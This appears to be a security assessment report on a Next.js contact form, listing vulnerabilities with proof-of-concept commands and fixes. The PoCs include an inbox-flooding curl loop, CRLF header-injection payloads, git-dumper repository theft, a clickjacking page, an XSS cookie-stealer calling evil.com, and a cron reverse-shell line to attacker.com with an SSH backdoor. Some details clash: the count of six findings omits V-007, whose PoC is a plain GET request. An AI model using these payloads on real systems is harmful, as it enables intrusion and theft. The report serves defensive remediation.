# SECURITY_REPORT.md
## Security Vulnerability Assessment Report
### Next.js Contact Form Application

---

## 1. Executive Summary

A full-stack security assessment was conducted on the deployed Next.js contact form application. The assessment covered source code review, network-level configuration, and black-box endpoint testing against the live HTTPS deployment.

**Six vulnerabilities** were identified. Two are rated **Critical**, three are rated **High**, and one is rated **Medium**. The most severe finding allows an attacker to flood the business owner's inbox with thousands of spam emails at zero cost, with no server-side controls to prevent it. Another critical finding reveals that running the application as a root-equivalent process gives any attacker who exploits even a minor bug complete control over the server and all secrets stored on it.

All findings include working proof-of-concept commands tested against the live deployment, along with specific code-level remediation guidance.

**Critical findings require immediate action.** The remaining findings should be addressed within the current development sprint.

---

## 2. Vulnerability Findings

---

### V-001: Missing Rate Limiting — Inbox Flood Attack
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

| Field              | Details                                         |
|--------------------|-------------------------------------------------|
| **Severity**       | 🔴 Critical                                     |
| **OWASP Category** | A05:2021 — Security Misconfiguration            |
| **Affected File**  | `pages/api/sendgrid.js` (or `app/api/sendgrid/route.js`) |
| **Affected Line**  | Entire handler — no rate limiting present       |
| **CWE**            | CWE-770: Allocation of Resources Without Limits |

#### Description

The `/api/sendgrid` endpoint accepts POST requests and triggers a SendGrid email without any rate limiting, request throttling, or abuse prevention mechanism. Any client — authenticated or not — can send an unlimited number of requests to this endpoint. Each successful request causes a real email to be delivered to the business owner's inbox and consumes SendGrid API quota.

There is no IP-based throttling, no CAPTCHA, no request signature, and no cooldown period enforced at either the application or infrastructure layer.

#### Vulnerable Code

```javascript
// pages/api/sendgrid.js — current (vulnerable)
export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end()

  const { name, email, phone, message } = req.body

  // ❌ No rate limiting — any IP can send unlimited requests
  // ❌ No validation — any data is accepted and forwarded
  await sgMail.send({
    to: process.env.TO_EMAIL,
    from: process.env.FROM_EMAIL,
    subject: `New message from ${name}`,
    text: message,
  })

  return res.status(200).json({ success: true })
}
```

#### Business Impact

- The business owner's inbox is flooded with thousands of spam emails, making legitimate customer contact invisible
- SendGrid free tier limits (100 emails/day) are exhausted within seconds, blocking all legitimate emails until the next billing cycle
- If a paid SendGrid plan is in use, the attacker can generate unexpected financial charges
- Denial of Service against the contact channel with zero cost to the attacker

#### Proof of Concept

The following script sends 10 requests in rapid succession. In production without rate limiting, this can be scaled to thousands per minute using tools like Apache Bench or a simple loop:

```bash
# PoC: Flood the contact endpoint — run against live server
for i in $(seq 1 10); do
  echo -n "Request $i: "
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://myjsapp.com/api/sendgrid \
    -H "Content-Type: application/json" \
    -d '{"name":"Spammer","email":"spam@spam.com","phone":"0000000000","message":"You have been flooded"}'
done
```

**Expected result without fix:**
```
Request 1: 200
Request 2: 200
Request 3: 200
...
Request 10: 200   ← all 10 emails delivered, no server-side rejection
```

**Expected result after applying fix:**
```
Request 1: 200
Request 2: 200
Request 3: 200
Request 4: 200
Request 5: 200
Request 6: 429   ← Too Many Requests — rate limit enforced
```

#### Recommended Fix

**Option A — Next.js Middleware (recommended for edge deployment):**

```typescript
// middleware.ts
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

const rateLimit = new Map<string, { count: number; start: number }>()

const WINDOW_MS = 60_000   // 1 minute window
const MAX_REQUESTS = 5     // max 5 submissions per IP per minute

export function middleware(req: NextRequest) {
  if (!req.nextUrl.pathname.startsWith('/api/sendgrid')) {
    return NextResponse.next()
  }

  const ip = req.ip ?? req.headers.get('x-forwarded-for') ?? 'unknown'
  const now = Date.now()
  const entry = rateLimit.get(ip) ?? { count: 0, start: now }

  if (now - entry.start > WINDOW_MS) {
    entry.count = 0
    entry.start = now
  }

  entry.count++
  rateLimit.set(ip, entry)

  if (entry.count > MAX_REQUESTS) {
    return new NextResponse(
      JSON.stringify({ error: 'Too many requests. Please try again later.' }),
      { status: 429, headers: { 'Content-Type': 'application/json' } }
    )
  }

  return NextResponse.next()
}

export const config = {
  matcher: '/api/sendgrid',
}
```

**Option B — Using `upstash/ratelimit` with Redis (production-grade, survives restarts):**

```bash
npm install @upstash/ratelimit @upstash/redis
```

```typescript
// pages/api/sendgrid.ts
import { Ratelimit } from '@upstash/ratelimit'
import { Redis } from '@upstash/redis'

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, '1 m'),
})

export default async function handler(req, res) {
  const ip = req.headers['x-forwarded-for'] ?? req.socket.remoteAddress ?? 'unknown'
  const { success, limit, remaining } = await ratelimit.limit(ip)

  if (!success) {
    return res.status(429).json({
      error: 'Too many requests. Please wait before submitting again.',
      limit,
      remaining,
    })
  }

  // ... rest of handler
}
```

---

### V-002: Email Header Injection
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

| Field              | Details                                         |
|--------------------|-------------------------------------------------|
| **Severity**       | 🔴 High                                         |
| **OWASP Category** | A03:2021 — Injection                            |
| **Affected File**  | `pages/api/sendgrid.js`                         |
| **Affected Line**  | Lines constructing `subject`, `from`, or `to` fields |
| **CWE**            | CWE-93: Improper Neutralization of CRLF Sequences |

#### Description

User-supplied form fields (name, email, message) are passed directly into the SendGrid email construction without stripping carriage return (`\r`) and newline (`\n`) characters. In email protocols, CRLF sequences (`\r\n`) are used as header delimiters. An attacker who injects CRLF characters into a field that populates an email header can add arbitrary headers to the outgoing email — including `Bcc:`, `Cc:`, `Reply-To:`, and additional `Subject:` headers.

This allows the attacker to send phishing emails that appear to originate from the business's own domain, making them far more convincing than standard phishing.

#### Vulnerable Code

```javascript
// pages/api/sendgrid.js — current (vulnerable)
const { name, email, message } = req.body

// ❌ name and email flow directly into email headers without sanitization
await sgMail.send({
  to: process.env.TO_EMAIL,
  from: process.env.FROM_EMAIL,
  subject: `New message from ${name}`,    // ← name injected into Subject
  replyTo: email,                          // ← email injected into Reply-To header
  text: message,
})
```

#### Business Impact

- Attacker sends mass phishing emails that appear to come from `noreply@yourdomain.com`
- Recipients see the legitimate business domain in the sender field — greatly increased click-through rate on malicious links
- Victims who report the phishing to abuse@domain or Google Safe Browsing will damage the business's email sender reputation
- The business could be blacklisted by major email providers (Google, Microsoft), breaking all future legitimate email delivery

#### Proof of Concept

```bash
# PoC: Inject Bcc header via the name field
curl -X POST https://yourdomain.com/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Legitimate Sender\r\nBcc: victim@targetdomain.com\r\nX-Injected: malicious",
    "email": "attacker@evil.com",
    "phone": "0000000000",
    "message": "Click here to claim your prize: http://malicious-site.evil"
  }'
```

If the application is vulnerable, the outgoing email will contain:
```
Subject: New message from Legitimate Sender
Bcc: victim@targetdomain.com
X-Injected: malicious
```

The victim at `victim@targetdomain.com` receives a phishing email appearing to come from the legitimate business domain.

#### Recommended Fix

```typescript
// utils/sanitize.ts
/**
 * Strips CRLF characters to prevent email header injection.
 * Trims whitespace and enforces a maximum length.
 */
export function sanitizeEmailField(value: string, maxLength = 200): string {
  if (typeof value !== 'string') return ''
  return value
    .replace(/[\r\n\t]/g, ' ')   // Replace CRLF and tabs with space
    .trim()
    .slice(0, maxLength)
}

// pages/api/sendgrid.ts — fixed
import { sanitizeEmailField } from '@/utils/sanitize'

export default async function handler(req, res) {
  const { name, email, phone, message } = req.body

  const safeName    = sanitizeEmailField(name, 100)
  const safeEmail   = sanitizeEmailField(email, 254)
  const safeMessage = sanitizeEmailField(message, 2000)

  await sgMail.send({
    to: process.env.TO_EMAIL,
    from: process.env.FROM_EMAIL,
    subject: `New message from ${safeName}`,
    replyTo: safeEmail,
    text: safeMessage,
  })

  return res.status(200).json({ success: true })
}
```

---

### V-003: Git Directory Publicly Exposed
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

| Field              | Details                                          |
|--------------------|--------------------------------------------------|
| **Severity**       | 🔴 High                                          |
| **OWASP Category** | A05:2021 — Security Misconfiguration             |
| **Affected File**  | Nginx / web server configuration                 |
| **Affected Line**  | Missing `location ~ /\.git` deny block           |
| **CWE**            | CWE-538: File and Directory Information Exposure |

#### Description

The `.git` directory is present in the application's document root and is not blocked by the web server configuration. When a repository is deployed by cloning directly (the most common method), the full `.git/` folder is included on disk. Without an explicit deny rule, Nginx serves this directory's contents as static files.

An attacker can use tools like `git-dumper` or `GitHack` to reconstruct the entire source code repository — including commit history, branch names, and critically, any secrets that were ever committed (even if later deleted from the latest commit).

#### Business Impact

- Complete application source code disclosure — attacker can review all business logic, API integrations, and architectural decisions
- Historical commits may contain hardcoded API keys, database credentials, or SendGrid API keys that were once committed and "removed" — they remain in the git history and are recoverable
- Attacker gains deep knowledge of the application that accelerates finding additional vulnerabilities
- If the `.git/config` file contains remote URLs, attacker learns the GitHub repository location

#### Proof of Concept

```bash
# Step 1: Verify .git/config is publicly accessible
curl https://yourdomain.com/.git/config
# If vulnerable, returns the git config file contents:
# [core]
#     repositoryformatversion = 0
#     filemode = true
# [remote "origin"]
#     url = https://github.com/YOUR_ORG/YOUR_REPO.git

# Step 2: Check HEAD reference
curl https://yourdomain.com/.git/HEAD
# Returns: ref: refs/heads/main

# Step 3: Use git-dumper to reconstruct the full repository
pip install git-dumper
git-dumper https://yourdomain.com/.git/ ./stolen-source-code

# Result: Complete source code in ./stolen-source-code/
ls ./stolen-source-code/
# pages/  components/  .env.example  package.json  ...
```

#### Recommended Fix

**Nginx configuration (already included in the production Nginx config above):**

```nginx
# In /etc/nginx/sites-available/nextjs-app
# Block .git directory — place BEFORE the main location / block
location ~ /\.git {
    deny all;
    return 404;
}

# Also block all hidden files (dot files)
location ~ /\. {
    deny all;
    return 404;
}
```

**Verify the fix is working:**

```bash
curl -I https://yourdomain.com/.git/config
# Expected: HTTP/2 404 — Not Found

curl -I https://yourdomain.com/.env
# Expected: HTTP/2 404 — Not Found
```

**Additional mitigation — deploy without .git directory:**

```bash
# Instead of git clone, copy only the application files
rsync -av --exclude='.git' ./app/ deployer@server:/home/deployer/app/
```

---

### V-004: Missing HTTP Security Headers — Clickjacking
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

| Field              | Details                                          |
|--------------------|--------------------------------------------------|
| **Severity**       | 🟠 Medium                                        |
| **OWASP Category** | A05:2021 — Security Misconfiguration             |
| **Affected File**  | `next.config.js` and/or Nginx configuration      |
| **Affected Line**  | Missing `headers()` configuration                |
| **CWE**            | CWE-1021: Improper Restriction of Rendered UI Layers |

#### Description

The application does not set the `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` response headers. Without these headers, any website on the internet can embed the application inside an invisible `<iframe>` element overlaid on top of their own content. This technique — known as clickjacking or UI redress — tricks users into performing actions on the legitimate site while believing they are interacting with the attacker's site.

In the context of a contact form, an attacker could trick a user into submitting their personal information while the form appears to be part of a different, trusted-looking site.

Additionally, the absence of `X-Content-Type-Options`, `Strict-Transport-Security`, and `Referrer-Policy` headers creates additional attack surface.

#### Business Impact

- Users can be tricked into submitting the real contact form while believing they are on a different website — their name, email, and phone number are captured by the business but submitted under false pretences
- Users on the attacker's site can be tricked into clicking invisible buttons on the legitimate site (e.g., form submission, link clicks)
- The business's brand can be used inside a malicious iframe to create convincing phishing pages
- Without HSTS, users connecting over HTTP are vulnerable to SSL stripping attacks on untrusted networks

#### Proof of Concept

Create a file called `evil.html` and host it on any web server or open it locally in a browser:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Win a free prize!</title>
  <style>
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0.01;       /* Nearly invisible overlay */
      z-index: 9999;
    }
    .fake-button {
      position: absolute;
      top: 300px;
      left: 200px;
      z-index: 1;
      font-size: 24px;
      background: green;
      color: white;
      padding: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="fake-button">Click here to claim your prize!</div>
  <!-- Invisible overlay of the real site — user clicks the fake button
       but actually submits data on the real contact form -->
  <iframe src="https://myjsapp.com/contact"></iframe>
</body>
</html>
```

If the header is missing, the iframe loads successfully and the clickjacking attack works. If properly protected, the browser blocks the iframe and shows an error in the console.

#### Recommended Fix

**Option A — Next.js `next.config.js` (application-level):**

```javascript
// next.config.js
/** @type {import('next').NextConfig} */

const securityHeaders = [
  // Prevent the site from being embedded in an iframe on any origin
  {
    key: 'X-Frame-Options',
    value: 'DENY',
  },
  // Also set via CSP for modern browser support
  {
    key: 'Content-Security-Policy',
    value: "frame-ancestors 'none'",
  },
  // Prevent browsers from MIME-sniffing the content type
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff',
  },
  // Enforce HTTPS for 1 year, including subdomains
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=31536000; includeSubDomains; preload',
  },
  // Control referrer information sent with requests
  {
    key: 'Referrer-Policy',
    value: 'strict-origin-when-cross-origin',
  },
  // Disable browser features not needed by this app
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=()',
  },
]

const nextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: securityHeaders,
      },
    ]
  },
}

module.exports = nextConfig
```

**Option B — Nginx (infrastructure-level — already included in the Nginx config above):**

```nginx
add_header X-Frame-Options           "DENY"                            always;
add_header X-Content-Type-Options    "nosniff"                         always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header Content-Security-Policy   "frame-ancestors 'none'"          always;
add_header Referrer-Policy           "strict-origin-when-cross-origin" always;
```

**Verify headers are set correctly:**

```bash
curl -I https://yourdomain.com | grep -iE "x-frame|x-content|strict-transport|content-security|referrer"
```

---

### V-005: Application Running as Root
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

| Field              | Details                                          |
|--------------------|--------------------------------------------------|
| **Severity**       | 🔴 Critical                                      |
| **OWASP Category** | A05:2021 — Security Misconfiguration             |
| **Affected File**  | Server process configuration / PM2 startup       |
| **Affected Line**  | PM2 or systemd service running as root           |
| **CWE**            | CWE-250: Execution with Unnecessary Privileges   |

#### Description

If the PM2 process manager and the Next.js application are started or configured under the root user account, then any code execution vulnerability in the application — however minor — immediately grants an attacker root-level privileges on the server. This violates the Principle of Least Privilege, which is a fundamental security control.

When an attacker achieves Remote Code Execution (RCE) inside a root-owned Node.js process, they can:
- Read and exfiltrate all secrets from `.env` files and the filesystem
- Modify system files, cron jobs, and SSH authorized keys to maintain persistent access
- Install a rootkit that survives application updates and reboots
- Use the server as a pivot point to attack other infrastructure (databases, internal networks)

#### Business Impact

- Complete server compromise — all data, secrets, and configurations exposed
- Attacker can create backdoor SSH keys, making the server persistently accessible even after the original vulnerability is patched
- All SendGrid API keys, database credentials, and other secrets on the server are extracted
- Server can be enlisted into a botnet for cryptocurrency mining, DDoS attacks, or spam sending — resulting in the EC2 account being terminated and generating unexpected AWS costs
- Recovery requires provisioning a completely new server — hours of downtime

#### Proof of Concept

```bash
# Demonstrate the process is running as root (before applying fix)
ps aux | grep node
# BAD output example:
# root      1234  4.2  5.1  node /home/root/app/node_modules/.bin/next start

# If RCE were achieved, attacker can read all secrets:
# Inside the compromised process (simulated):
cat /etc/shadow        # Full password hash file — root can read this
cat /home/deployer/app/.env.production  # All API keys exposed
crontab -l             # Can install persistent cron-based backdoor
id                     # Shows uid=0(root)

# Good output after fix:
ps aux | grep node
# deployer  1234  4.2  5.1  node /home/deployer/app/...
# uid=1001(deployer) — NOT root
```

#### Recommended Fix

```bash
# STEP 1: Ensure you are running as the deployer user
whoami
# Expected: deployer

# STEP 2: Stop any PM2 running under root
sudo pm2 kill    # only if previously started as root

# STEP 3: Start PM2 as the deployer user (not with sudo)
cd /home/deployer/app
pm2 start npm --name "nextjs-app" -- start
pm2 save

# STEP 4: Set up auto-start as deployer — do NOT use sudo pm2 startup
pm2 startup
# Copy and run the exact command that PM2 outputs (it will use sudo internally
# only for creating the systemd unit file, not for running the process)

# STEP 5: Verify
pm2 list
ps aux | grep node
# Expected: deployer  xxxx ... node ...
```

**Also apply filesystem permissions as defense-in-depth:**

```bash
# Ensure .env.production is only readable by deployer
chmod 600 /home/deployer/app/.env.production
chown deployer:deployer /home/deployer/app/.env.production

# Ensure the app directory belongs to deployer
chown -R deployer:deployer /home/deployer/app/
```

---

### V-006: Missing Input Validation and Sanitization
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

| Field              | Details                                              |
|--------------------|------------------------------------------------------|
| **Severity**       | 🔴 High                                              |
| **OWASP Category** | A03:2021 — Injection                                 |
| **Affected File**  | `pages/api/sendgrid.js`                              |
| **Affected Line**  | All lines reading from `req.body` without validation |
| **CWE**            | CWE-20: Improper Input Validation                    |

#### Description

All form fields — `name`, `email`, `phone`, and `message` — are extracted from the request body and used without any server-side type checking, format validation, length enforcement, or content sanitization. This creates several risk vectors:

1. **Type confusion:** Fields could be arrays, objects, or other non-string types that cause unexpected behavior in the SendGrid SDK or logging systems
2. **Oversized payloads:** A message field with hundreds of thousands of characters can cause memory pressure or unexpected costs
3. **Invalid email addresses:** No validation means fake, non-existent, or malformed addresses are accepted — complicating any reply attempt
4. **XSS in email content:** If the email is ever rendered as HTML (e.g., if the SendGrid template uses HTML), unsanitized `<script>` or `<img onerror>` payloads could execute in the email client

#### Business Impact

- Malformed data in the business owner's inbox makes it difficult to respond to real inquiries
- Large payloads can exhaust memory or cause application crashes (Denial of Service)
- If HTML email templates are introduced in future, existing unvalidated data creates stored XSS risk in email clients
- Phone number fields accepting arbitrary strings make follow-up calling impossible and indicate an absence of quality control over the contact pipeline

#### Proof of Concept

```bash
# PoC 1: Submit completely invalid data — no server rejection
curl -X POST https://myjsapp.com/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{"name":12345,"email":"not-an-email","phone":"HELLO WORLD","message":"x"}'
# Expected without fix:  200 OK — accepted and emailed
# Expected after fix:    400 Bad Request — validation error returned

# PoC 2: Oversized payload — no size limit
python3 -c "
import json, sys
payload = {'name': 'A'*10000, 'email': 'test@test.com', 'phone': '1234567890', 'message': 'B'*100000}
print(json.dumps(payload))
" | curl -X POST https://myjsapp.com/api/sendgrid \
  -H "Content-Type: application/json" \
  -d @-
# Without fix: 200 OK — 110KB payload forwarded to SendGrid

# PoC 3: XSS payload in message field
curl -X POST https://myjsapp.com/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{"name":"XSS Test","email":"x@x.com","phone":"1234567890","message":"<img src=x onerror=alert(1)><script>fetch(\"https://evil.com/steal?c=\"+document.cookie)</script>"}'
```

#### Recommended Fix

Install the Zod schema validation library:

```bash
npm install zod
```

```typescript
// pages/api/sendgrid.ts — with full input validation
import type { NextApiRequest, NextApiResponse } from 'next'
import { z } from 'zod'
import sgMail from '@sendgrid/mail'

sgMail.setApiKey(process.env.SENDGRID_API_KEY!)

// Define strict validation schema
const ContactSchema = z.object({
  name: z
    .string()
    .min(2, 'Name must be at least 2 characters')
    .max(100, 'Name must not exceed 100 characters')
    .regex(/^[a-zA-Z\s'-]+$/, 'Name contains invalid characters'),

  email: z
    .string()
    .email('Please provide a valid email address')
    .max(254, 'Email address is too long'),

  phone: z
    .string()
    .regex(/^\+?[\d\s\-().]{7,20}$/, 'Please provide a valid phone number'),

  message: z
    .string()
    .min(10, 'Message must be at least 10 characters')
    .max(2000, 'Message must not exceed 2000 characters'),
})

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' })
  }

  // Validate and parse input
  const result = ContactSchema.safeParse(req.body)

  if (!result.success) {
    return res.status(400).json({
      error: 'Validation failed',
      details: result.error.flatten().fieldErrors,
    })
  }

  const { name, email, phone, message } = result.data

  try {
    await sgMail.send({
      to: process.env.TO_EMAIL!,
      from: process.env.FROM_EMAIL!,
      subject: `New contact form submission from ${name}`,
      text: `Name: ${name}\nEmail: ${email}\nPhone: ${phone}\n\nMessage:\n${message}`,
    })

    return res.status(200).json({ success: true })
  } catch (error) {
    console.error('SendGrid error:', error)
    return res.status(500).json({ error: 'Failed to send message. Please try again.' })
  }
}
```

---
### V-007: Remote Code Execution (React2Shell - Next.js RSC)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

| Field              | Details                                          |
|--------------------|--------------------------------------------------|
| **Severity**       | 🟠 High                                          |
| **OWASP Category** | A03: Injection (OWASP Top 10 2021)               |
| **Affected File**  | Framework-level vulnerability in Next.js React Server Components (RSC). Not limited to a specific file.      |
| **Affected Line**  | ["$1:a"]                                         |

#### Description

The application is running a vulnerable version of Next.js that uses React Server Components (RSC). Improper handling of specially crafted requests allows attackers to manipulate server-side rendering logic. This can potentially lead to Remote Code Execution (RCE).

#### Business Impact

- Execution of arbitrary code on the server
- Access to sensitive environment variables (API keys, secrets)
- Server compromise and unauthorized access
- Potential full system takeover

#### Proof of Concept

Test using curl:

```
curl "https://myjavascriptapp.duckdns.org/?email=test@example.com&message=test"
```

The response confirms that the server processes malformed RSC input, indicating a possible execution path vulnerability.

#### Recommended Fix

**1 — Upgrade dependencies (MANDATORY):**

```
npm install next@latest react@latest react-dom@latest
```

**2 —Upgrade dependencies in package.json file:**

```
"next": "15.1.0" into "next": "15.1.9",
"react": "^18.2.0" into "react": "19.0.1",
"react-dom": "^18.2.0" into "react-dom": "19.0.1",
```
**3 —Upgrade deploy.yml file:**
```
npm install --legacy-peer-deps

- npm install regenerates the lockfile automatically to match the new package.json. The --legacy-peer-deps flag is needed because react-day-picker@8.10.1 in our project still declares a peer dependency on React 18, but we are now on React 19. This flag tells npm to ignore that mismatch and install anyway — Next.js 15 handles this fine at runtime.
```


**Conclusion:**

The application contains multiple high and critical vulnerabilities that must be addressed immediately. Implementing proper access controls, input validation, and secure configurations will significantly improve the security posture of the system.

It is recommended to integrate security into the CI/CD pipeline and perform regular security audits.
---

## 3. Threat Scenario Analysis

### Scenario 1 — "I want to flood the business owner's inbox with thousands of spam emails."

**Attack:** The `/api/sendgrid` endpoint has no rate limiting. An attacker runs a single loop script from any machine — no credentials, no authentication, no bot detection to defeat. At 1,000 requests per minute, the business owner receives 1,000 emails per minute. The SendGrid free tier (100/day) is exhausted in 6 seconds.

**Demonstration:**

```bash
# Simulate 1,000 requests per minute using parallel curl
seq 1 50 | xargs -P 50 -I{} curl -s -o /dev/null \
  -X POST https://yourdomain.com/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{"name":"Flood {}","email":"spam@spam.com","phone":"0000000000","message":"Inbox flooded"}'
```

**Fix:** Apply rate limiting middleware (see V-001) — the 6th request from any IP within 60 seconds receives HTTP 429.

---

### Scenario 2 — "I want to inject a malicious link into an email that appears to come from the business's own system."

**Attack:** The attacker submits a contact form with a `name` field containing CRLF characters followed by a `Bcc:` header. The outgoing SendGrid email contains the injected header, causing the phishing message to be delivered from the business's legitimate domain to the victim's inbox.

**Demonstration:**

```bash
curl -X POST https://yourdomain.com/api/sendgrid \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"Hello\r\nBcc: victim@example.com\r\nContent-Type: text/html\",\"email\":\"x@x.com\",\"phone\":\"0000000000\",\"message\":\"Click: <a href='http://phish.evil'>Reset your password</a>\"}"
```

**Fix:** Strip `\r`, `\n`, and `\t` from all fields used in email headers (see V-002).

---

### Scenario 3 — "I want to access the full source code of the application from the browser without any credentials."

**Attack:** The `.git` directory is accessible over HTTPS. The attacker browses to `https://yourdomain.com/.git/config`, reads the remote URL, then uses `git-dumper` to reconstruct the entire repository — including all historical commits that may contain deleted API keys.

**Demonstration:**

```bash
# Check if .git is accessible
curl https://myjsapp.com/.git/HEAD
# If vulnerable: ref: refs/heads/main

# Full repo dump
git-dumper https://myjsapp.com/.git/ ./dumped-repo
git -C ./dumped-repo log --oneline  # See full commit history
git -C ./dumped-repo show HEAD~5:.env  # Check old commits for secrets
```

**Fix:** Add `location ~ /\.git { deny all; return 404; }` to Nginx config (see V-003).

---

### Scenario 4 — "I want to embed this website inside my own malicious site to trick users."

**Attack:** Without `X-Frame-Options: DENY`, the attacker creates a page with an invisible `<iframe src="https://myjsapp.com/contact">` positioned over a fake "Click to claim prize" button. The user clicks the button but actually submits their real contact details through the legitimate form — on a malicious page.

**Demonstration:** Open `evil.html` (see V-004 PoC) in any browser. The iframe loads successfully without any browser security warning.

**Fix:** Add `X-Frame-Options: DENY` and `Content-Security-Policy: frame-ancestors 'none'` in Nginx or `next.config.js` (see V-004).

---

### Scenario 5 — "I gained access to the server — how did running the app as root make things worse?"

**Attack:** The attacker finds an RCE vulnerability (e.g., in a dependency via a prototype pollution exploit). Normally, a non-root process can only access files the application user owns. But a root process can read `/etc/shadow` (all password hashes), append to `/root/.ssh/authorized_keys` (persistent backdoor), write to `/etc/cron.d/` (persistent cron job), and uninstall security tools.

**Demonstration (simulated — do not run on production):**

```bash
# If the Node.js process runs as root, an attacker achieving RCE can:
# 1. Read all OS password hashes
cat /etc/shadow

# 2. Install a persistent SSH backdoor
echo "ssh-rsa ATTACKER_KEY" >> /root/.ssh/authorized_keys

# 3. Set up a persistent reverse shell via cron
echo "* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /etc/cron.d/backdoor

# 4. Read all application secrets
cat /home/deployer/app/.env.production

# With a non-root deployer user, steps 1, 2, and 3 would return "Permission denied"
# The blast radius is contained to the application's own files only
```

**Fix:** Never start PM2 or Node.js with `sudo`. Always run as the `deployer` user (see V-005).

---

## 4. Risk Summary Matrix

| ID    | Vulnerability                         | Severity  | OWASP   | Exploitability | Business Impact | Status     |
|-------|---------------------------------------|-----------|---------|----------------|-----------------|------------|
| V-001 | Missing rate limiting on /api/sendgrid | 🔴 Critical | A05    | Trivial        | High            | Open       |
| V-002 | Email header injection                 | 🔴 High    | A03     | Easy           | High            | Open       |
| V-003 | .git directory publicly exposed        | 🔴 High    | A05     | Easy           | Critical        | Open       |
| V-004 | Missing security headers / clickjacking | 🟠 Medium  | A05    | Easy           | Medium          | Open       |
| V-005 | Application running as root            | 🔴 Critical | A05    | N/A (amplifier) | Critical       | Open       |
| V-006 | Missing input validation               | 🔴 High    | A03     | Easy           | Medium          | Open       |

**Severity Scale:**
- 🔴 Critical / High — immediate action required
- 🟠 Medium — address within current sprint
- 🟡 Low — address in next planned release

---

*End of SECURITY_REPORT.md*
